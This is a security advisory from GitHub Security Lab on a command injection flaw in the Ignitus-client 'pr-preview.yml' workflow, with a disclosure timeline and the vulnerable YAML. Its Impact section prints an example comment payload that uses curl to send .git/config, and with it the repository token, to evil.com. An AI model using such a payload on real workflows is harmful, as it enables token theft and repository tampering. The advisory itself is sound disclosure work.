<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">February 3, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-193: Command injection in Ignitus/Ignitus-client workflow</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/jarlob">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/26652396?s=35" height="35" width="35">
        <span>Jaroslav Lobacevski</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>10/16/2020: Report sent to vendor</li>
  <li>10/29/2020: Vendor acknowledges</li>
  <li>10/29/2020: Vendor fixes the issue</li>
</ul>

<h2 id="summary">Summary</h2>

<p>The <a href="https://github.com/Ignitus/Ignitus-client/blob/master/.github/workflows/pr-preview.yml">‘pr-preview.yml’ GitHub workflow</a> is vulnerable to arbitrary command injection.</p>

<h2 id="product">Product</h2>

<p><a href="https://github.com/Ignitus/Ignitus-client">Ignitus/Ignitus-client GitHub repository</a></p>

<h2 id="tested-version">Tested Version</h2>

<p><a href="https://github.com/Ignitus/Ignitus-client/blob/master/.github/workflows/pr-preview.yml">pr-preview.yml</a> from the master branch.</p>

<h2 id="details">Details</h2>

<h3 id="issue-the-public-github-issue-comment-is-used-to-format-a-shell-command">Issue: The public GitHub issue comment is used to format a shell command</h3>

<p>When a user comments on a public issue it automatically starts the <a href="https://github.com/Ignitus/Ignitus-client/blob/master/.github/workflows/pr-preview.yml">pr-preview.yml</a> GitHub workflow. The comment text is used to format a bash script.</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">on</span><span class="pi">:</span>
  <span class="na">issue_comment</span><span class="pi">:</span>
    <span class="na">types</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">created</span><span class="pi">]</span>
<span class="na">jobs</span><span class="pi">:</span>
  <span class="na">deploy_preview</span><span class="pi">:</span>
    <span class="na">name</span><span class="pi">:</span> <span class="s">Deploy Preview of PR</span>
    <span class="na">runs-on</span><span class="pi">:</span> <span class="s">ubuntu-latest</span>
    <span class="na">steps</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="na">uses</span><span class="pi">:</span> <span class="s">actions/setup-node@v1</span>
      <span class="pi">-</span> <span class="na">uses</span><span class="pi">:</span> <span class="s">actions/checkout@v2</span>
      <span class="pi">-</span> <span class="na">run</span><span class="pi">:</span> <span class="s">npm install yaml -s</span>
      <span class="pi">-</span> <span class="na">run</span><span class="pi">:</span> <span class="s">echo "::set-env name=worker::$( node ./scripts/deploy-preview/verify.js ${{ github.event.comment.user.login }} "${{ github.event.comment.body }}" )"</span>
<span class="nn">...</span>
</code></pre></div></div>

<h4 id="impact">Impact</h4>

<p>This vulnerability allows for arbitrary command injection into the bash script. For example a user may comment with <code class="language-plaintext highlighter-rouge">"; curl -d @.git/config http://evil.com; sleep 10 )"</code> which will exfiltrate the temporary GitHub repository authorization token to the attacker controlled server. Although the token is not valid after the workflow finishes, since the attacker controls the execution of the workflow he or she can delay it to give the malicious server time to modify the repository. To make the attack less visible the attacker may modify the comment later.</p>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/JarLob">@JarLob (Jaroslav Lobačevski)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-193</code> in any communication regarding this issue.</p>
